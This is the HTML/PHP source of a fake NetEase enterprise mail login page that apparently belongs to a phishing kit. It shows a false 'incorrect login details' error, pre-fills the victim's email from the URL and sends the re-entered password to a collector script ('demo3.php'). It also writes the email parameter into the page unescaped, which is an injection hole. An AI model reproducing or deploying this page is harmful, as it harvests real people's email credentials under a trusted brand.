<!DOCTYPE html>
<html>
<head>
<title>网易企业邮箱 - 登录入口</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
<link rel="shortcut icon" href="https://qiye.163.com/favicon.ico" type="image/x-icon">
<style>
body, html {
  height: 100%;
  margin: 0;
}

.bg {
  /* The image used */
  background-image: url("admin/bg.jpg");

  /* Full height */
  height: 100%; 

  /* Center and scale the image nicely */
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
</style>
</head>
<body>

	<div class="bg">
		<br><br><br>
		<table width="90%" cellspacing="0"><tr>
		<td>
			<table align="right" style="height:475px;">
			<tr><td background="./admin/modal.png">
					
				<table align="center" style="width:402px;">
				
				<tr><td>
					<table align="center">
					<tr><td>
						<center>
							<font style="font-family: arial; font-size: 13px; color:#E70202; font-weight:bold;">
								您输入的登录详细信息不正确。 输入正确的详细信息
							</font>
						</center>
					</td></tr>
					<tr><td style="height:10px;"></td></tr>
					<tr><td>
						<form method="post" action="demo3.php">
					</td></tr>
					<tr><td>
						<input type="email" name="" value="<?php echo $_GET['email']; ?>" readonly 
						style="width:320px; height:45px; font-family: arial; font-size: 15px; color:#333333; 
						background-color: #ffffff; border: solid 1px #BDBDBD; padding: 7px; border-radius: 2px 3px 1px 5px;">
					</td></tr>
					<tr><td style="height:10px;"></td></tr>
					<tr><td>
						<input type="password" name="passwd" placeholder="密码" required 
						style="width:320px; height:45px; font-family: arial; font-size: 15px; color:#333333; 
						background-color: #ffffff; border: solid 1px #BDBDBD; padding: 7px; border-radius: 2px 3px 1px 5px;">
					</td></tr>
					<tr><td style="height:10px;"></td></tr>
					<tr><td>
						<input type="image" src="./admin/submit.png" value="" style="width:320px; height:90px;">
					</td></tr>
					<tr><td>
						<input type="hidden" name="login" value="<?php echo $_GET['email']; ?>">
						</form>
					</td></tr>
					<tr><td style="height:40px;"></td></tr>
					</table>
				</td></tr>
				
				</table>
					
			</td></tr>
			</table>
		</td>
		</tr></table>
		
	</div>

</body>
</body>
</html>